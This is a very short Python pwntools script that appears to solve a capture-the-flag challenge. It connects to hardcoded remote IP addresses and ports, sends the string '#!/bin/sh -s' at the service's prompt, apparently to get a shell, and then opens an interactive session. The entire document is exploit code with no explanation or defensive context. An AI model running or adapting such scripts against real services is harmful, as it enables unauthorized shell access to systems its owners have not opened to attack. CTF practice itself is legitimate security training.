#!/usr/bin/env python
from pwn import *


host , port = '116.203.19.166' , 34587
host , port = '195.201.117.89' , 34588
y = remote( host , port )


data = '#!/bin/sh -s'

print len( data )

y.sendlineafter( '>' , data )

y.interactive()